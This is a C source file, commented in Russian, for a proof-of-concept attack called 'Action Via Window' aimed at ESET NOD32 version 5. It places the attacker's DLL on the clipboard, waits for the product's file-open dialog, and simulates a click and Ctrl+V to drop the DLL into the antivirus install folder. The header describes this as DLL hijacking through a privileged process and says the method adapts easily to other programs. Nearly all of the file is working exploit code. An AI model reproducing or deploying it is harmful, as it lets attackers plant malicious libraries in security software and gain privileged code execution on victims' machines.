/***************************************************************************************************************\
*																												*
*											aviwa.exe															*
*																												*
*									"Action Via Window" attack													*
*											   PoC																* 
*																												*
* aviwa.exe работает в паре с ppeset.dll (нашей длл, она же feclient.dll);										*
* Значит, вначале кладём данную прогу и нашу длл в одну папку. Затем запускаем эту прогу.						*
* Она создаст директорию C:\xlogs, скопирует "файл" в буфер обмена (БО) и начнёт искать окно по определённому	*
* имени. Если окно будет найдено, прога отыщет процесс, создавший это окно и определит его текущую директорию.	*
* Если директория подходит нам для атаки (вставка файла через окно), то ещё проверим, имеется ли уже наша длл	*
* в этой папке. Если нет, то производим атаку. Если да, то выходим.												* 
* Т.о, если процесс имеет админские привилегии, то мы можем закидывать файл в системные папки (dll hijacking)	* 
* и т.п. (а также делать другие фичи: копирование, удаление, перемешение etc).									* 
*																												*
* Данный PoC заточен для применения в NOD32 (v5), но может (с лёгкостью) быть переделан для других прог (окон)	*
*																												*
* Нужное диалоговое окно может быть вызвано в нод32, например, так:												*
* ESS NOD32 правая мышка на значке в трее -> Open ESS5 -> Setup -> Import and export settings -> ... ->			*
* окно "Открыть";																								* 
*																												* 
\***************************************************************************************************************/

																							//m1x
																							//pr0mix@mail.ru
																							//EOF



#include "clipboard.h"
#include "misc.h"
#include <stdio.h>


 
/***************************************************************************************************\
*	Функа main; 
*	наша главная функа, вперёд!
* 
\***************************************************************************************************/
int main()
{
	char szFileName[MAX_PATH];	//после здесь будет храниться полный путь (включая имя) dll, откуда будем вырезать её; dll и данная прога должны лежать в одной папке!; 
	char szDirName[] = "C:\\xlogs";	//создаём директорию для dll (там она создаст логи и будет в него пилякать разную инфу);
	char szWndName[] = "Открыть";	//будем искать окно по имени; 
	char *pszCurDir;	//указатель на строку - текущую директорию нужного процесса; 
	char szDesiredDir[MAX_PATH] = "C:\\Program Files\\ESET\\ESET Smart Security\\";	//желаемая директория для вставки файла; 
	char szDllName[] = "ppeset.dll"; //"AhResXUITA.dll"; //feclient.dll; 
	char *pszFullPath;	//полный путь (включая имя) dll, куда будем вставлять её; 
	LPSTR *pPart; 
//	char *pszFrom;
//	char szTo[] = "C:\\Games\\123\\123\\feclient1.dll\0\0";
//	char **pszFilesName;
//	int i = 0;
//	int op_type = -1;
	int len = 0;
	RECT rect = {0, 0, 0, 0}; 
	HWND hFindWnd;
	DWORD pid = 0;

	GetModuleFileNameA(0, szFileName, MAX_PATH);	//получаем полный путь к данной проге;
	GetFullPathNameA(szFileName, MAX_PATH, szFileName, &pPart);	//pPart - указывает на имя проги; 
	pPart[0] = 0;	//обнуляем имя - получаем просто полный путь (без имени - ёба); 
	CreateDirectoryA(szDirName, 0);	//создаём директорию для нашей длл (она там создаст лог и будет в него писать); 
	strcat(szFileName, szDllName);	//добавляем имя файла, который будем закидывать в определённое окно по нажатию клавиш Ctrl+V; 
	len = strlen(szFileName);
	szFileName[len] = 0;	//список должен заканчиваться 2-мя завершающимися нулями; 
	szFileName[len + 1] = 0;

	if(!CopyPasteFileToClipboard(0, szFileName, DROPEFFECT_MOVE))	//помещаем список файлов в БО (сейчас только одно полное имя файла); 
	{
		printf("main: error: CopyPasteFileToClipboard is FAULT!\n"); 
		return 0;
	}

/*
	pszFilesName = GetDataFromClipboard(0);	//получаем список файлов из БО; 

	if(!pszFilesName)
	{
		printf("main: GetDataFromClipboard is FAULT!\n"); 
		return 0;
	}

	len = strlen(pszFilesName[i]);	//помним, что сейчас у нас в БО только одно имя файла! получаем его длину; 
	pszFrom = (char*)malloc(sizeof(char) * len + 2);	//выделяем память (+2 '\0');
	
	if(!pszFrom)
	{
		printf("main: pszFrom = 0!\n"); 
		return 0;
	}

	strcpy(pszFrom, pszFilesName[i]);	//копируем это имя; 
	pszFrom[len] = 0;
	pszFrom[len + 1] = 0;	//теперь у нас строка с двумя завершающимися символами '\0'; 

	printf("pszFrom = %s\n", pszFrom); 

	while(pszFilesName[i])
	{
		printf("pszFilesName[%d] = %s\n", i, pszFilesName[i]);
		free(pszFilesName[i]);
		i++;
	}

	free(pszFilesName);

	op_type = ClipboardOperationType(0);	//узнаём тип операции в БО; 

	printf("op_type = %d\n", op_type); 

//	CopyPasteFileToDisk(pszFrom, szTo, op_type);	//выполняем нужное действие с указанным файлом (копирование/перемещение); 
*/

	pszFullPath = (char*)malloc(sizeof(char) * (strlen(szDesiredDir) + strlen(szDllName)) + 1);	//выделяем память;

	if(!pszFullPath)
	{
		printf("main: error: pszFullPath = 0!\n"); 
		return 0;
	}

	strcpy(pszFullPath, szDesiredDir);	//сохраняем полный путь, куда будем перемещать файл (dll); 
	strcat(pszFullPath, szDllName); 

	while(1)
	{
		hFindWnd = GetPIDOnWindow(szWndName, &pid);	//ищем нужное нам окно по имени, и получаем ID процесса, который создал данное окно; 

		if(hFindWnd)	//нашли?
		{
			pszCurDir = GetStringFromProcess(pid, STR_CURDIR);	//получаем текущую директорию процесса, который создал нужное нам окно; 

			if(!pszCurDir)
			{
				printf("main: error: pszCurDir = 0!\n"); 
				free(pszFullPath);
				return 0;
			}

			if(stricmp(pszCurDir, szDesiredDir) == 0)	//проверяем, является ли текущая директория процесса нужной директорией для вставки файла?
			{
				if(GetFileAttributesA(pszFullPath) == INVALID_FILE_ATTRIBUTES)	//теперь проверим, есть ли в этой директории нужный файл? если нет, значит будем его вставлять. Если есть, значит мы его уже вставили, выходим; 
				{
					ShowWindow(hFindWnd, SW_SHOWNORMAL);	//показываем окно в нормальном режиме, 
					SetForegroundWindow(hFindWnd);	//а также активизируем его (ввод с клавы переводится на данное окошко); 

					if(IsWindowSuitable(hFindWnd))	//если окно пригодное (см выше), то 
					{
						GetWindowRect(hFindWnd, &rect);	//получаем координаты заданного окна
						ClickLBM(hFindWnd, (rect.left + 400), (rect.top + 200));	//кликаем по заданной территории окна (если это окно выбора файлов, то щелчок происходит по SHELLDLL_DefView->SysListView32, т.о. теперь мы сможем туда закидывать Ctrl + V); 

						keybd_event(VK_CONTROL, 0, 0, 0);	//отправляем заданному окну Ctrl + V (вставка файла); 
						keybd_event('V', 0, 0, 0);
						keybd_event('V', 0, KEYEVENTF_KEYUP, 0); 
						keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0); 
					}
				}
				else
				{
					free(pszCurDir);
					free(pszFullPath);
					break;	//прерываем цикл и выходим; 
				}
			}

			free(pszCurDir);
		}

		printf("."); 
		Sleep(1000); 
	}
	
	printf("\nmain: success: the job is done!\n");	//отлично! 

	return 0;
}
/***************************************************************************************************\
*	конец функи main; 
\***************************************************************************************************/
 